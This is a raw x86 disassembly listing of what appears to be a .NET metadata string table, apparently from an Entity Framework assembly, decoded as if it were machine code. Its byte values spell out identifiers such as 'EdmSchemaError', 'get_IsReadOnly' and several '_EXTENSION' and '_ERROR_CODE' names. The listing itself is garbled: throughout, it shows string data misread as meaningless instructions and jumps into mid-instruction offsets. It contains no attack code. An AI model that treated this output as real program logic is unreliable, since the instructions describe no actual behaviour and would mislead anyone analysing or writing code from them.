  408153:	outs   dx,BYTE PTR ds:[esi]
  408154:	inc    ebp
  408155:	js     0x4081cb
  408157:	outs   dx,BYTE PTR gs:[esi]
  408159:	jae    0x4081c4
  40815b:	outs   dx,DWORD PTR ds:[esi]
  40815c:	outs   dx,BYTE PTR ds:[esi]
  40815d:	add    BYTE PTR [edi+0x66],bl
  408160:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  408168:	jae    0x4081d3
  40816a:	outs   dx,DWORD PTR ds:[esi]
  40816b:	outs   dx,BYTE PTR ds:[esi]
  40816c:	jae    0x40816e
  40816e:	inc    ecx
  40816f:	fs add BYTE PTR fs:[ebx+0x6c],al
  408174:	gs popa 
  408176:	jb     0x408178
  408178:	inc    ebx
  408179:	outs   dx,DWORD PTR ds:[esi]
  40817a:	outs   dx,BYTE PTR ds:[esi]
  40817b:	je     0x4081de
  40817d:	imul   ebp,DWORD PTR [esi+0x73],0x706f4300
  408184:	jns    0x4081da
  408186:	outs   dx,DWORD PTR ds:[esi]
  408187:	add    BYTE PTR [edi+0x65],ah
  40818a:	je     0x4081eb
  40818c:	dec    ecx
  40818d:	jae    0x4081e1
  40818f:	gs popa 
  408191:	fs dec edi
  408193:	outs   dx,BYTE PTR ds:[esi]
  408194:	ins    BYTE PTR es:[edi],dx
  408195:	jns    0x408197
  408197:	push   edx
  408198:	gs ins DWORD PTR es:[edi],dx
  40819a:	outs   dx,DWORD PTR ds:[esi]
  40819b:	jbe    0x408202
  40819d:	add    BYTE PTR [ecx+0x45],cl
  4081a0:	outs   dx,BYTE PTR ds:[esi]
  4081a1:	jne    0x408210
  4081a3:	gs jb  0x408207
  4081a6:	je     0x408217
  4081a8:	jb     0x40820a
  4081aa:	xor    DWORD PTR [eax],eax
  4081ac:	inc    edi
  4081ad:	gs je  0x4081f5
  4081b0:	outs   dx,BYTE PTR ds:[esi]
  4081b1:	jne    0x408220
  4081b3:	gs jb  0x408217
  4081b6:	je     0x408227
  4081b8:	jb     0x4081ba
  4081ba:	dec    ecx
  4081bb:	inc    ebp
  4081bc:	outs   dx,BYTE PTR ds:[esi]
  4081bd:	jne    0x40822c
  4081bf:	gs jb  0x408223
  4081c2:	je     0x408233
  4081c4:	jb     0x4081c6
  4081c6:	push   ebx
  4081c7:	jns    0x40823c
  4081c9:	je     0x408230
  4081cb:	ins    DWORD PTR es:[edi],dx
  4081cc:	cs inc ebx
  4081ce:	outs   dx,DWORD PTR ds:[esi]
  4081cf:	ins    BYTE PTR es:[edi],dx
  4081d0:	ins    BYTE PTR es:[edi],dx
  4081d1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4081d6:	outs   dx,BYTE PTR ds:[esi]
  4081d7:	jae    0x408207
  4081d9:	dec    ecx
  4081da:	inc    ebp
  4081db:	outs   dx,BYTE PTR ds:[esi]
  4081dc:	jne    0x40824b
  4081de:	gs jb  0x408242
  4081e1:	bound  ebp,QWORD PTR [ebp+eiz*2+0x2e]
  4081e5:	inc    edi
  4081e6:	gs je  0x40822e
  4081e9:	outs   dx,BYTE PTR ds:[esi]
  4081ea:	jne    0x408259
  4081ec:	gs jb  0x408250
  4081ef:	je     0x408260
  4081f1:	jb     0x4081f3
  4081f3:	dec    ecx
  4081f4:	jae    0x408248
  4081f6:	gs popa 
  4081f8:	fs dec edi
  4081fa:	outs   dx,BYTE PTR ds:[esi]
  4081fb:	ins    BYTE PTR es:[edi],dx
  4081fc:	jns    0x4081fe
  4081fe:	inc    ebx
  4081ff:	outs   dx,DWORD PTR ds:[esi]
  408200:	outs   dx,BYTE PTR ds:[esi]
  408201:	jae    0x408272
  408203:	ins    BYTE PTR es:[edi],dx
  408204:	gs inc ebx
  408206:	outs   dx,DWORD PTR ds:[esi]
  408207:	ins    BYTE PTR es:[edi],dx
  408208:	outs   dx,DWORD PTR ds:[esi]
  408209:	jb     0x40820b
  40820b:	inc    ebp
  40820c:	push   edx
  40820d:	push   edx
  40820e:	dec    edi
  40820f:	push   edx
  408210:	pop    edi
  408211:	inc    ebx
  408212:	dec    edi
  408213:	dec    esp
  408214:	dec    edi
  408215:	push   edx
  408216:	add    BYTE PTR [edi+0x41],dl
  408219:	push   edx
  40821a:	dec    esi
  40821b:	dec    ecx
  40821c:	dec    esi
  40821d:	inc    edi
  40821e:	pop    edi
  40821f:	inc    ebx
  408220:	dec    edi
  408221:	dec    esp
  408222:	dec    edi
  408223:	push   edx
  408224:	add    BYTE PTR [ebp+0x49],cl
  408227:	push   ebx
  408228:	push   ebx
  408229:	dec    ecx
  40822a:	dec    esi
  40822b:	inc    edi
  40822c:	pop    edi
  40822d:	push   eax
  40822e:	push   edx
  40822f:	dec    edi
  408230:	push   esi
  408231:	dec    ecx
  408232:	inc    esp
  408233:	inc    ebp
  408234:	push   edx
  408235:	pop    edi
  408236:	dec    ebp
  408237:	inc    ecx
  408238:	dec    esi
  408239:	dec    ecx
  40823a:	inc    esi
  40823b:	inc    ebp
  40823c:	push   ebx
  40823d:	push   esp
  40823e:	pop    edi
  40823f:	push   esp
  408240:	dec    edi
  408241:	dec    ebx
  408242:	inc    ebp
  408243:	dec    esi
  408244:	pop    edi
  408245:	inc    ebp
  408246:	push   edx
  408247:	push   edx
  408248:	dec    edi
  408249:	push   edx
  40824a:	pop    edi
  40824b:	inc    ebx
  40824c:	dec    edi
  40824d:	inc    esp
  40824e:	inc    ebp
  40824f:	add    BYTE PTR [edi+0x74],bl
  408252:	outs   dx,DWORD PTR ds:[esi]
  408253:	je     0x4082b6
  408255:	ins    BYTE PTR es:[edi],dx
  408256:	push   edi
  408257:	popa   
  408258:	jb     0x4082c8
  40825a:	imul   ebp,DWORD PTR [esi+0x67],0x6e756f43
  408261:	je     0x408263
  408263:	pop    edi
  408264:	je     0x4082d5
  408266:	je     0x4082c9
  408268:	ins    BYTE PTR es:[edi],dx
  408269:	inc    ebp
  40826a:	jb     0x4082de
  40826c:	outs   dx,DWORD PTR ds:[esi]
  40826d:	jb     0x4082b2
  40826f:	outs   dx,DWORD PTR ds:[esi]
  408270:	jne    0x4082e0
  408272:	je     0x408274
  408274:	pop    edi
  408275:	popa   
  408276:	jb     0x4082df
  408278:	jne    0x4082e7
  40827a:	outs   dx,BYTE PTR gs:[esi]
  40827c:	je     0x4082f1
  40827e:	add    BYTE PTR [ebp+0x61],cl
  408281:	imul   ebp,DWORD PTR [esi+0x0],0x6e456f44
  408288:	je     0x4082f3
  40828a:	je     0x408305
  40828c:	inc    ebx
  40828d:	ins    BYTE PTR es:[edi],dx
  40828e:	popa   
  40828f:	jae    0x408304
  408291:	inc    edi
  408292:	outs   dx,BYTE PTR gs:[esi]
  408294:	gs jb  0x4082f8
  408297:	je     0x408302
  408299:	outs   dx,DWORD PTR ds:[esi]
  40829a:	outs   dx,BYTE PTR ds:[esi]
  40829b:	add    BYTE PTR [edi+0x65],al
  40829e:	outs   dx,BYTE PTR ds:[esi]
  40829f:	gs jb  0x408303
  4082a2:	je     0x408309
  4082a4:	dec    edi
  4082a5:	bound  ebp,QWORD PTR [edx+0x65]
  4082a8:	arpl   WORD PTR [esp+ecx*2+0x61],si
  4082ac:	jns    0x408313
  4082ae:	jb     0x4082f3
  4082b0:	outs   dx,DWORD PTR ds:[esi]
  4082b1:	fs add BYTE PTR gs:[ecx+eiz*2+0x6e],cl
  4082b7:	addr16 jne 0x40831b
  4082ba:	addr16 gs dec edi
  4082bd:	jo     0x408333
  4082bf:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  4082c6:	dec    esp
  4082c7:	popa   
  4082c8:	outs   dx,BYTE PTR ds:[esi]
  4082c9:	addr16 jne 0x40832d
  4082cc:	addr16 gs dec edi
  4082cf:	jo     0x408345
  4082d1:	imul   ebp,DWORD PTR [edi+0x6e],0x74614400
  4082d8:	popa   
  4082d9:	push   ebx
  4082da:	gs jb  0x408353
  4082dd:	imul   esp,DWORD PTR [ebx+0x65],0x65646f43
  4082e4:	push   esi
  4082e5:	gs jb  0x40835b
  4082e8:	imul   ebp,DWORD PTR [edi+0x6e],0x74654700
  4082ef:	inc    esp
  4082f0:	popa   
  4082f1:	je     0x408354
  4082f3:	push   ebx
  4082f4:	gs jb  0x40836d
  4082f7:	imul   esp,DWORD PTR [ebx+0x65],0x65646f43
  4082fe:	push   esi
  4082ff:	gs jb  0x408375
  408302:	imul   ebp,DWORD PTR [edi+0x6e],0x694c4900
  408309:	jae    0x40837f
  40830b:	pusha  
  40830c:	xor    DWORD PTR [eax],eax
  40830e:	push   ebx
  40830f:	jns    0x408384
  408311:	je     0x408378
  408313:	ins    DWORD PTR es:[edi],dx
  408314:	cs inc esp
  408316:	popa   
  408317:	je     0x40837a
  408319:	cs inc ebp
  40831b:	outs   dx,BYTE PTR ds:[esi]
  40831c:	je     0x408387
  40831e:	je     0x408399
  408320:	add    BYTE PTR [ebx+0x79],dl
  408323:	jae    0x408399
  408325:	gs ins DWORD PTR es:[edi],dx
  408327:	cs inc esp
  408329:	popa   
  40832a:	je     0x40838d
  40832c:	cs dec ebp
  40832e:	gs je  0x408392
  408331:	fs popa 
  408333:	je     0x408396
  408335:	cs inc ebp
  408337:	fs ins DWORD PTR es:[edi],dx
  408339:	add    BYTE PTR [ebp+0x64],al
  40833c:	ins    DWORD PTR es:[edi],dx
  40833d:	push   ebx
  40833e:	arpl   WORD PTR [eax+0x65],bp
  408341:	ins    DWORD PTR es:[edi],dx
  408342:	popa   
  408343:	inc    ebp
  408344:	jb     0x4083b8
  408346:	outs   dx,DWORD PTR ds:[esi]
  408347:	jb     0x408349
  408349:	dec    eax
  40834a:	popa   
  40834b:	outs   dx,BYTE PTR ds:[esi]
  40834c:	fs ins BYTE PTR es:[edi],dx
  40834e:	gs inc ebp
  408350:	jb     0x4083c4
  408352:	outs   dx,DWORD PTR ds:[esi]
  408353:	jb     0x4083c8
  408355:	add    BYTE PTR [ecx+ebp*2+0x73],al
  408359:	jo     0x4083c7
  40835b:	popa   
  40835c:	jns    0x40839f
  40835e:	outs   dx,BYTE PTR ds:[esi]
  40835f:	fs inc ebx
  408361:	outs   dx,DWORD PTR ds:[esi]
  408362:	jne    0x4083d2
  408364:	je     0x4083ab
  408366:	jb     0x4083da
  408368:	outs   dx,DWORD PTR ds:[esi]
  408369:	jb     0x4083de
  40836b:	add    BYTE PTR [ebp+0x64],al
  40836e:	ins    DWORD PTR es:[edi],dx
  40836f:	push   ebx
  408370:	arpl   WORD PTR [eax+0x65],bp
  408373:	ins    DWORD PTR es:[edi],dx
  408374:	popa   
  408375:	inc    ebp
  408376:	jb     0x4083ea
  408378:	outs   dx,DWORD PTR ds:[esi]
  408379:	jb     0x4083ce
  40837b:	gs jbe 0x4083e3
  40837e:	jb     0x4083e9
  408380:	je     0x4083fb
  408382:	add    BYTE PTR [edi+0x65],al
  408385:	je     0x4083ca
  408387:	outs   dx,DWORD PTR ds:[esi]
  408388:	outs   dx,BYTE PTR ds:[esi]
  408389:	jae    0x4083fa
  40838b:	ins    BYTE PTR es:[edi],dx
  40838c:	gs inc ebx
  40838e:	outs   dx,DWORD PTR ds:[esi]
  40838f:	ins    BYTE PTR es:[edi],dx
  408390:	outs   dx,DWORD PTR ds:[esi]
  408391:	jb     0x4083d4
  408393:	outs   dx,BYTE PTR ds:[esi]
  408394:	fs dec ecx
  408396:	outs   dx,BYTE PTR ds:[esi]
  408397:	arpl   WORD PTR [edx+0x65],si
  40839a:	ins    DWORD PTR es:[edi],dx
  40839b:	outs   dx,BYTE PTR gs:[esi]
  40839d:	je     0x4083e2
  40839f:	outs   dx,DWORD PTR ds:[esi]
  4083a0:	jne    0x408410
  4083a2:	je     0x4083a4
  4083a4:	inc    esp
  4083a5:	imul   esi,DWORD PTR [ebx+0x70],0x4379616c
  4083ac:	outs   dx,DWORD PTR ds:[esi]
  4083ad:	ins    DWORD PTR es:[edi],dx
  4083ae:	jo     0x40841c
  4083b0:	gs je  0x40841c
  4083b3:	outs   dx,DWORD PTR ds:[esi]
  4083b4:	outs   dx,BYTE PTR ds:[esi]
  4083b5:	dec    ebp
  4083b6:	gs jae 0x40842c
  4083b9:	popa   
  4083ba:	add    BYTE PTR gs:[bp+di+0x72],al
  4083bf:	gs popa 
  4083c1:	je     0x408428
  4083c3:	inc    ebp
  4083c4:	fs ins DWORD PTR es:[edi],dx
  4083c6:	push   ebx
  4083c7:	arpl   WORD PTR [eax+0x65],bp
  4083ca:	ins    DWORD PTR es:[edi],dx
  4083cb:	popa   
  4083cc:	inc    ebp
  4083cd:	jb     0x408441
  4083cf:	outs   dx,DWORD PTR ds:[esi]
  4083d0:	jb     0x40841f
  4083d2:	gs jae 0x408448
  4083d5:	popa   
  4083d6:	add    BYTE PTR gs:[si+0x69],al
  4083db:	jae    0x40844d
  4083dd:	ins    BYTE PTR es:[edi],dx
  4083de:	popa   
  4083df:	jns    0x408426
  4083e1:	fs ins DWORD PTR es:[edi],dx
  4083e3:	push   ebx
  4083e4:	arpl   WORD PTR [eax+0x65],bp
  4083e7:	ins    DWORD PTR es:[edi],dx
  4083e8:	popa   
  4083e9:	inc    ebp
  4083ea:	jb     0x40845e
  4083ec:	outs   dx,DWORD PTR ds:[esi]
  4083ed:	jb     0x40843c
  4083ef:	gs jae 0x408465
  4083f2:	popa   
  4083f3:	add    BYTE PTR gs:[di+0x78],al
  4083f8:	je     0x40846c
  4083fa:	popa   
  4083fb:	arpl   WORD PTR [esi+eax*2+0x75],si
  4083ff:	ins    BYTE PTR es:[edi],dx
  408400:	ins    BYTE PTR es:[edi],dx
  408401:	inc    ebp
  408402:	js     0x408467
  408404:	gs jo  0x40847b
  408407:	imul   ebp,DWORD PTR [edi+0x6e],0x7373654d
  40840e:	popa   
  40840f:	add    BYTE PTR gs:[bp+di+0x6c],al
  408414:	imul   esp,DWORD PTR [ebp+0x6e],0x616c4374
  40841b:	jae    0x408490
  40841d:	inc    edi
  40841e:	outs   dx,BYTE PTR gs:[esi]
  408420:	gs jb  0x408484
  408423:	je     0x40848e
  408425:	outs   dx,DWORD PTR ds:[esi]
  408426:	outs   dx,BYTE PTR ds:[esi]
  408427:	add    BYTE PTR [edx+0x61],al
  40842a:	jae    0x408491
  40842c:	push   esi
  40842d:	popa   
  40842e:	ins    BYTE PTR es:[edi],dx
  40842f:	jne    0x408496
  408431:	add    BYTE PTR [ebp+0x78],al
  408434:	arpl   WORD PTR [ebp+0x70],sp
  408437:	je     0x4084a2
  408439:	outs   dx,DWORD PTR ds:[esi]
  40843a:	outs   dx,BYTE PTR ds:[esi]
  40843b:	inc    ebx
  40843c:	popa   
  40843d:	jne    0x4084a6
  40843f:	push   0x694d0074
  408444:	jae    0x4084b9
  408446:	imul   ebp,DWORD PTR [esi+0x67],0x726f7453
  40844d:	gs inc ebp
  40844f:	outs   dx,BYTE PTR ds:[esi]
  408450:	je     0x4084bb
  408452:	je     0x4084cd
  408454:	inc    ebx
  408455:	outs   dx,DWORD PTR ds:[esi]
  408456:	outs   dx,BYTE PTR ds:[esi]
  408457:	je     0x4084ba
  408459:	imul   ebp,DWORD PTR [esi+0x65],0x6e490072
  408460:	jbe    0x4084c3
  408462:	ins    BYTE PTR es:[edi],dx
  408463:	imul   esp,DWORD PTR [ebp+eax*2+0x6e],0x61506d75
  40846b:	jb     0x4084ce
  40846d:	ins    DWORD PTR es:[edi],dx
  40846e:	push   esi
  40846f:	popa   
  408470:	ins    BYTE PTR es:[edi],dx
  408471:	jne    0x4084d8
  408473:	add    BYTE PTR [ebp+0x69],cl
  408476:	jae    0x4084eb
  408478:	imul   ebp,DWORD PTR [esi+0x67],0x75716552
  40847f:	imul   esi,DWORD PTR [edx+0x65],0x72615064
  408486:	popa   
  408487:	ins    DWORD PTR es:[edi],dx
  408488:	add    BYTE PTR [edx+0x61],al
  40848b:	fs ins BYTE PTR es:[edi],dx
  40848d:	jns    0x4084d5
  40848f:	outs   dx,DWORD PTR ds:[esi]
  408490:	jb     0x4084ff
  408492:	gs fs push eax
  408495:	popa   
  408496:	jb     0x4084f9
  408498:	ins    DWORD PTR es:[edi],dx
  408499:	gs je  0x408501
  40849c:	jb     0x40849e
  40849e:	dec    ecx
  40849f:	outs   dx,BYTE PTR ds:[esi]
  4084a0:	jbe    0x408503
  4084a2:	ins    BYTE PTR es:[edi],dx
  4084a3:	imul   esp,DWORD PTR [esi+eax*2+0x69],0x7954656c
  4084ab:	jo     0x408512
  4084ad:	add    BYTE PTR [eax+0x61],dl
  4084b0:	je     0x40851a
  4084b2:	inc    ecx
  4084b3:	jb     0x40851c
  4084b5:	jne    0x408524
  4084b7:	outs   dx,BYTE PTR gs:[esi]
  4084b9:	je     0x408504
  4084bb:	jae    0x40850b
  4084bd:	outs   dx,DWORD PTR ds:[esi]
  4084be:	je     0x408516
  4084c0:	popa   
  4084c1:	ins    BYTE PTR es:[edi],dx
  4084c2:	imul   esp,DWORD PTR [eax+eax*1+0x4e],0x6772416f
  4084ca:	jne    0x408539
  4084cc:	outs   dx,BYTE PTR gs:[esi]
  4084ce:	je     0x408543
  4084d0:	add    BYTE PTR [ebp+0x73],cl
  4084d3:	ins    BYTE PTR es:[edi],dx
  4084d4:	push   edi
  4084d5:	imul   esi,DWORD PTR [eax+ebp*2+0x6f],0x73437475
  4084dd:	fs ins BYTE PTR es:[edi],dx
  4084df:	dec    edi
  4084e0:	jb     0x408535
  4084e2:	jae    0x408548
  4084e4:	ins    BYTE PTR es:[edi],dx
  4084e5:	add    BYTE PTR [esi+0x6f],cl
  4084e8:	push   ebx
  4084e9:	arpl   WORD PTR [eax+0x65],bp
  4084ec:	ins    DWORD PTR es:[edi],dx
  4084ed:	popa   
  4084ee:	inc    esi
  4084ef:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x766f7250
  4084f7:	imul   esp,DWORD PTR [ebp+eiz*2+0x64],0x72655a00
  4084ff:	outs   dx,DWORD PTR ds:[esi]
  408500:	inc    esi
  408501:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x50726f46
  408509:	popa   
  40850a:	jb     0x40856d
  40850c:	ins    DWORD PTR es:[edi],dx
  40850d:	gs je  0x408575
  408510:	jb     0x408512
  408512:	push   esp
  408513:	outs   dx,DWORD PTR ds:[esi]
  408514:	outs   dx,DWORD PTR ds:[esi]
  408515:	dec    ebp
  408516:	popa   
  408517:	outs   dx,BYTE PTR ds:[esi]
  408518:	jns    0x408560
  40851a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x73],0x50726f46
  408522:	popa   
  408523:	jb     0x408586
  408525:	ins    DWORD PTR es:[edi],dx
  408526:	gs je  0x40858e
  408529:	jb     0x40852b
  40852b:	dec    ecx
  40852c:	outs   dx,BYTE PTR ds:[esi]
  40852d:	jbe    0x408590
  40852f:	ins    BYTE PTR es:[edi],dx
  408530:	imul   esp,DWORD PTR [esi+ecx*2+0x61],0x7073656d
  408538:	popa   
  408539:	arpl   WORD PTR [ebp+0x4e],sp
  40853c:	popa   
  40853d:	ins    DWORD PTR es:[edi],dx
  40853e:	gs inc esi
  408540:	jb     0x4085b1
  408542:	ins    DWORD PTR es:[edi],dx
  408543:	push   eax
  408544:	jb     0x4085b5
  408546:	push   0x65
  408548:	arpl   WORD PTR [eax+eax*1+0x49],si
  40854c:	outs   dx,BYTE PTR ds:[esi]
  40854d:	jbe    0x4085b0
  40854f:	ins    BYTE PTR es:[edi],dx
  408550:	imul   esp,DWORD PTR [ebp+eax*2+0x6e],0x79746974
  408558:	inc    ebx
  408559:	outs   dx,DWORD PTR ds:[esi]
  40855a:	outs   dx,BYTE PTR ds:[esi]
  40855b:	je     0x4085be
  40855d:	imul   ebp,DWORD PTR [esi+0x65],0x6d614e72
  408564:	gs inc esi
  408566:	jb     0x4085d7
  408568:	ins    DWORD PTR es:[edi],dx
  408569:	push   eax
  40856a:	jb     0x4085db
  40856c:	push   0x65
  40856e:	arpl   WORD PTR [eax+eax*1+0x49],si
  408572:	outs   dx,BYTE PTR ds:[esi]
  408573:	jbe    0x4085d6
  408575:	ins    BYTE PTR es:[edi],dx
  408576:	imul   esp,DWORD PTR [eax+edx*2+0x61],0x536d6172
  40857e:	ja     0x4085e9
  408580:	je     0x4085e5
  408582:	push   0x6c694600
  408587:	gs inc ebp
  408589:	js     0x4085ff
  40858b:	outs   dx,BYTE PTR gs:[esi]
  40858d:	jae    0x4085f8
  40858f:	outs   dx,DWORD PTR ds:[esi]
  408590:	outs   dx,BYTE PTR ds:[esi]
  408591:	dec    ebp
  408592:	imul   esi,DWORD PTR [ebx+0x73],0x676e69
  408599:	inc    esi
  40859a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x6e657478
  4085a2:	jae    0x40860d
  4085a4:	outs   dx,DWORD PTR ds:[esi]
  4085a5:	outs   dx,BYTE PTR ds:[esi]
  4085a6:	dec    esi
  4085a7:	outs   dx,DWORD PTR ds:[esi]
  4085a8:	je     0x408600
  4085aa:	popa   
  4085ab:	ins    BYTE PTR es:[edi],dx
  4085ac:	imul   esp,DWORD PTR [eax+eax*1+0x49],0x6c61766e
  4085b4:	imul   esp,DWORD PTR [esi+ecx*2+0x61],0x7073656d
  4085bc:	popa   
  4085bd:	arpl   WORD PTR [ebp+0x4e],sp
  4085c0:	popa   
  4085c1:	ins    DWORD PTR es:[edi],dx
  4085c2:	add    BYTE PTR gs:[ecx+0x6e],cl
  4085c6:	jbe    0x408629
  4085c8:	ins    BYTE PTR es:[edi],dx
  4085c9:	imul   esp,DWORD PTR [ebp+eax*2+0x6e],0x79746974
  4085d1:	inc    ebx
  4085d2:	outs   dx,DWORD PTR ds:[esi]
  4085d3:	outs   dx,BYTE PTR ds:[esi]
  4085d4:	je     0x408637
  4085d6:	imul   ebp,DWORD PTR [esi+0x65],0x6d614e72
  4085dd:	add    BYTE PTR gs:[ebp+0x6e],dl
  4085e1:	popa   
  4085e2:	bound  ebp,QWORD PTR [ebp+eiz*2+0x54]
  4085e6:	outs   dx,DWORD PTR ds:[esi]
  4085e7:	inc    esi
  4085e8:	imul   ebp,DWORD PTR [esi+0x64],0x63657053
  4085ef:	imul   esp,DWORD PTR [esi+0x69],0x69446465
  4085f6:	jb     0x408648
  4085f8:	popa   
  4085f9:	je     0x408663
  4085fb:	add    BYTE PTR [ebp+0x69],cl
  4085fe:	jae    0x408673
  408600:	imul   ebp,DWORD PTR [esi+0x67],0x656c6946
  408607:	dec    esi
  408608:	popa   
  408609:	ins    DWORD PTR es:[edi],dx
  40860a:	add    BYTE PTR gs:[eax+0x72],dl
  40860e:	outs   dx,DWORD PTR ds:[esi]
  40860f:	jbe    0x40867a
  408611:	fs gs jb 0x408662
  408615:	popa   
  408616:	outs   dx,BYTE PTR ds:[esi]
  408617:	imul   esp,DWORD PTR [esi+0x65],0x6f547473
  40861e:	imul   esp,DWORD PTR [ebp+0x6e],0x4d
  408622:	imul   esi,DWORD PTR [ebx+0x73],0x676e69
  408629:	inc    ebp
  40862a:	js     0x40868f
  40862c:	ins    BYTE PTR es:[edi],dx
  40862d:	jne    0x4086a2
  40862f:	imul   esi,DWORD PTR [esi+0x65],0x697255
  408636:	dec    ebp
  408637:	imul   esi,DWORD PTR [ebx+0x73],0x50676e69
  40863e:	popa   
  40863f:	jb     0x4086a2
  408641:	ins    DWORD PTR es:[edi],dx
  408642:	push   esi
  408643:	popa   
  408644:	ins    BYTE PTR es:[edi],dx
  408645:	jne    0x4086ac
  408647:	add    BYTE PTR [esi+0x65],dl
  40864a:	jb     0x4086bf
  40864c:	imul   ebp,DWORD PTR [edi+0x6e],0x65523156
  408653:	jno    0x4086ca
  408655:	imul   esi,DWORD PTR [edx+0x65],0x65735573
  40865c:	inc    esp
  40865d:	popa   
  40865e:	je     0x4086c1
  408660:	push   ebx
  408661:	gs jb  0x4086da
  408664:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  40866b:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408670:	outs   dx,BYTE PTR ds:[esi]
  408671:	inc    esi
  408672:	popa   
  408673:	ins    BYTE PTR es:[edi],dx
  408674:	jae    0x4086db
  408676:	add    BYTE PTR [ebx+0x53],al
  408679:	inc    esp
  40867a:	dec    esp
  40867b:	pop    edi
  40867c:	inc    ebp
  40867d:	pop    eax
  40867e:	push   esp
  40867f:	inc    ebp
  408680:	dec    esi
  408681:	push   ebx
  408682:	dec    ecx
  408683:	dec    edi
  408684:	dec    esi
  408685:	add    BYTE PTR [ebx+0x53],al
  408688:	pop    edi
  408689:	inc    ebp
  40868a:	pop    eax
  40868b:	push   esp
  40868c:	inc    ebp
  40868d:	dec    esi
  40868e:	push   ebx
  40868f:	dec    ecx
  408690:	dec    edi
  408691:	dec    esi
  408692:	add    BYTE PTR [esi+0x42],dl
  408695:	pop    edi
  408696:	inc    ebp
  408697:	pop    eax
  408698:	push   esp
  408699:	inc    ebp
  40869a:	dec    esi
  40869b:	push   ebx
  40869c:	dec    ecx
  40869d:	dec    edi
  40869e:	dec    esi
  40869f:	add    BYTE PTR [ebp+0x44],al
  4086a2:	dec    ebp
  4086a3:	pop    eax
  4086a4:	pop    edi
  4086a5:	inc    ebp
  4086a6:	pop    eax
  4086a7:	push   esp
  4086a8:	inc    ebp
  4086a9:	dec    esi
  4086aa:	push   ebx
  4086ab:	dec    ecx
  4086ac:	dec    edi
  4086ad:	dec    esi
  4086ae:	add    BYTE PTR [ecx+0x52],al
  4086b1:	inc    edi
  4086b2:	pop    edi
  4086b3:	dec    ecx
  4086b4:	dec    esi
  4086b5:	inc    ebx
  4086b6:	push   ebx
  4086b7:	inc    esp
  4086b8:	dec    esp
  4086b9:	add    BYTE PTR [ecx+0x52],al
  4086bc:	inc    edi
  4086bd:	pop    edi
  4086be:	dec    edi
  4086bf:	push   ebp
  4086c0:	push   esp
  4086c1:	dec    edi
  4086c2:	inc    edx
  4086c3:	dec    edx
  4086c4:	inc    ebp
  4086c5:	inc    ebx
  4086c6:	push   esp
  4086c7:	dec    esp
  4086c8:	inc    ecx
  4086c9:	pop    ecx
  4086ca:	inc    ebp
  4086cb:	push   edx
  4086cc:	add    BYTE PTR [ecx+0x52],al
  4086cf:	inc    edi
  4086d0:	pop    edi
  4086d1:	push   esi
  4086d2:	inc    ebp
  4086d3:	push   edx
  4086d4:	push   ebx
  4086d5:	dec    ecx
  4086d6:	dec    edi
  4086d7:	dec    esi
  4086d8:	add    BYTE PTR [ecx+0x52],al
  4086db:	inc    edi
  4086dc:	pop    edi
  4086dd:	inc    esp
  4086de:	inc    ecx
  4086df:	push   esp
  4086e0:	inc    ecx
  4086e1:	push   ebx
  4086e2:	inc    ebp
  4086e3:	push   edx
  4086e4:	push   esi
  4086e5:	dec    ecx
  4086e6:	inc    ebx
  4086e7:	inc    ebp
  4086e8:	inc    ebx
  4086e9:	dec    edi
  4086ea:	dec    esp
  4086eb:	dec    esp
  4086ec:	inc    ebp
  4086ed:	inc    ebx
  4086ee:	push   esp
  4086ef:	dec    ecx
  4086f0:	dec    edi
  4086f1:	dec    esi
  4086f2:	add    BYTE PTR [edi+0x6d],bl
  4086f5:	outs   dx,DWORD PTR ds:[esi]
  4086f6:	fs add BYTE PTR gs:[edi+0x70],bl
  4086fb:	jb     0x40876c
  4086fd:	jbe    0x408768
  4086ff:	fs gs jb 0x408703
  408703:	push   ebp
  408704:	jb     0x40876f
  408706:	add    BYTE PTR [edi+0x75],bl
  408709:	jb     0x408774
  40870b:	add    BYTE PTR [edi+0x69],bl
  40870e:	outs   dx,BYTE PTR ds:[esi]
  40870f:	inc    ebx
  408710:	jae    0x408776
  408712:	ins    BYTE PTR es:[edi],dx
  408713:	jae    0x408715
  408715:	pop    edi
  408716:	outs   dx,DWORD PTR ds:[esi]
  408717:	jne    0x40878d
  408719:	dec    edi
  40871a:	bound  ebp,QWORD PTR [edx+0x65]
  40871d:	arpl   WORD PTR [esp+ecx*2+0x61],si
  408721:	jns    0x408788
  408723:	jb     0x40876c
  408725:	outs   dx,BYTE PTR gs:[esi]
  408727:	gs jb  0x40878b
  40872a:	je     0x408795
  40872c:	outs   dx,DWORD PTR ds:[esi]
  40872d:	outs   dx,BYTE PTR ds:[esi]
  40872e:	add    BYTE PTR [edi+0x6c],bl
  408731:	popa   
  408732:	outs   dx,BYTE PTR ds:[esi]
  408733:	addr16 jne 0x408797
  408736:	add    BYTE PTR gs:[bx+0x75],bl
  40873b:	jae    0x4087a2
  40873d:	inc    esp
  40873e:	popa   
  40873f:	je     0x4087a2
  408741:	push   ebx
  408742:	gs jb  0x4087bb
  408745:	imul   esp,DWORD PTR [ebx+0x65],0x6c6c6f43
  40874c:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  408751:	outs   dx,BYTE PTR ds:[esi]
  408752:	add    BYTE PTR [edi+0x76],bl
  408755:	gs jb  0x4087cb
  408758:	imul   ebp,DWORD PTR [edi+0x6e],0x74656700
  40875f:	pop    edi
  408760:	dec    ebp
  408761:	outs   dx,DWORD PTR ds:[esi]
  408762:	fs add BYTE PTR gs:[edi+0x65],ah
  408767:	je     0x4087c8
  408769:	dec    ecx
  40876a:	outs   dx,BYTE PTR ds:[esi]
  40876b:	add    BYTE PTR [edi+0x65],ah
  40876e:	je     0x4087cf
  408770:	dec    edi
  408771:	jne    0x4087e7
  408773:	add    BYTE PTR [ebx+0x65],dh
  408776:	je     0x4087d7
  408778:	dec    edi
  408779:	jne    0x4087ef
  40877b:	add    BYTE PTR [edi+0x65],ah
  40877e:	je     0x4087df
  408780:	dec    esp
  408781:	popa   
  408782:	outs   dx,BYTE PTR ds:[esi]
  408783:	addr16 jne 0x4087e7
  408786:	add    BYTE PTR gs:[bp+di+0x65],dh
  40878b:	je     0x4087ec
  40878d:	dec    esp
